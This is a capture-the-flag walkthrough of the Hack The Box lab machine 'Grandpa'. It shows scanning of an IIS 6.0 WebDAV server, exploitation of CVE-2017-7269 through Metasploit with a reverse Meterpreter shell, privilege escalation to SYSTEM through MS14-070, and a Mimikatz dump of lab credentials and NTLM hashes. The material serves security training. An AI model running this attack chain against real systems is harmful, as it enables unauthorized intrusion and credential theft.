# Hackthebox Grandpa

Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

### Service Discovey

First, as always. we perform our initial enumeration of the box using Nmap.

```
Host is up (0.078s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH                                                                                                          
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   WebDAV type: Unkown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH                                                                                               
|_  Server Date: Tue, 27 Nov 2018 12:45:26 GMT
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4                    
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see that only port 80 is open and we also see that webdav is enabled. 

Running a nikto scan reveals a lot of potential webdav issues.

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2018-11-27 16:17:05 (GMT1)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                                                    
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type                                                                    
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH                                                                                           
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.                                                                                                             
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH                                                                                            
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.                                                                                                            
+ WebDAV enabled (COPY SEARCH MKCOL LOCK PROPPATCH UNLOCK PROPFIND listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.                                                                    
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_bin/shtml.exe/_vti_rpc: FrontPage may be installed.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).                                                                                     
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ /_vti_bin/_vti_adm/admin.exe: FrontPage/Sharepointfile available.
+ /_vti_bin/_vti_aut/author.exe: FrontPage/Sharepointfile available.
+ /_vti_bin/_vti_aut/author.dll: FrontPage/Sharepointfile available.
+ 7499 requests: 0 error(s) and 31 item(s) reported on remote host
+ End Time:           2018-11-27 16:27:39 (GMT1) (634 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


The host is running an IIS 6.0 webserver which is quite old. Searching for known exploits on IIS 6 we find a couple.


```
root@kali:~/htb# searchsploit IIS 6.0
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                                       |  Path
                                                                                                                                                                                     | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                                                                     | exploits/windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                              | exploits/windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                                | exploits/windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                                         | exploits/windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                               | exploits/windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                             | exploits/windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                          | exploits/windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                          | exploits/windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                                                                                                                        | exploits/windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                      | exploits/windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                             | exploits/windows/remote/19033.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```


## Initial Compromise

### CVE-2017-7269 - "ExplodingCan" 

The "WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow" is an interesting one. This exploit was actually part of the NSA code leak that happend in 2017 and it is also called "ExplodingCan". There is a metasploit module containing this exploit. 
Let's try that one:

```
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit 

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (179779 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.10.10.14:1233) at 2018-11-27 16:19:18 +0100

meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > 
```

Excellent so we have a meterpreter session on the host. But we could not determine our uid. This is probably because some sort of issue with the token of our precess. Let's spawn a shell.

```
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

So we are running as a network service account. 


## Pivilege Escalation

This is a pretty old box so there should be a couple of exploits that get us root.

Running the local_exploit_suggester Metasploit module confirms this:

```
msf post(multi/recon/local_exploit_suggester) > exploit 

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 28 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
Trying a couple of these out I get the folloowing error:
```
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.  
```

In cases like this it may be a good idea to migrate into another process to get a new token and try again. So I looked for a process that was a networkservice.

```
meterpreter > migrate 3528                                                                                                                                                                                                    
[*] Migrating from 3400 to 3528...                                                                                                                                                                                            
[*] Migration completed successfully. 
```

After this is done the exploitrs succeed.

```
msf exploit(windows/local/ms14_070_tcpip_ioctl) > exploit 

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Sending stage (179779 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.14.6:4444 -> 10.10.10.14:1236) at 2018-11-27 16:28:50 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

## Dumping Credentials

Let's dump some credentials on the box. We load Mimikatz in our meterpreter shell.

```
meterpreter > load mimikatz  
Loading extension mimikatz...Success.
meterpreter > wdigest 
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID     Package    Domain        User             Password
------     -------    ------        ----             --------
0;996      Negotiate  NT AUTHORITY  NETWORK SERVICE  
0;997      Negotiate  NT AUTHORITY  LOCAL SERVICE    
0;44271    NTLM                                      
0;999      NTLM       HTB           GRANPA$          
0;5533712  NTLM       GRANPA        IUSR_GRANPA      1_pEx9[v6;e24}
0;5555525  NTLM       GRANPA        IUSR_GRANPA      1_pEx9[v6;e24}

meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID     Package    Domain        User             Password
------     -------    ------        ----             --------
0;5533712  NTLM       GRANPA        IUSR_GRANPA      lm{ a274b4532c9ca5cdf684351fab962e86 }, ntlm{ 6a981cb5e038b2d8b713743a50d89c88 }
0;5555525  NTLM       GRANPA        IUSR_GRANPA      lm{ a274b4532c9ca5cdf684351fab962e86 }, ntlm{ 6a981cb5e038b2d8b713743a50d89c88 }
0;996      Negotiate  NT AUTHORITY  NETWORK SERVICE  lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0;997      Negotiate  NT AUTHORITY  LOCAL SERVICE    n.s. (Credentials KO)
0;44271    NTLM                                      n.s. (Credentials KO)
0;999      NTLM       HTB           GRANPA$          n.s. (Credentials KO)
```

The box Granny is really similar to this one, so I will be doing that box with a more manual approach and try to ditch Metasploit.
